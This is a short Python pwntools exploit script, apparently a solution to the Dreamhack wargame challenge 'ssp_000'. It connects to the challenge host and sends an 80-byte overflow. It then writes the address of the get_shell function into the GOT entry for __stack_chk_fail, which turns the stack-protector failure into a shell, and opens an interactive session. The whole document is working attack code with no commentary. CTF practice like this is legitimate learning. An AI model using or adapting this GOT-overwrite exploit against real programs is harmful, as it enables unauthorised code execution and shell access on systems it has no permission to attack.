from pwn import *
p = remote('host3.dreamhack.games', 10675)
elf = ELF('./ssp_000')
payload = b'a' * 80
p.sendline(payload)

p.sendlineafter(b'Addr : ', str(elf.got['__stack_chk_fail']).encode())
p.sendlineafter(b'Value : ',str(elf.symbols['get_shell']).encode())
p.interactive()

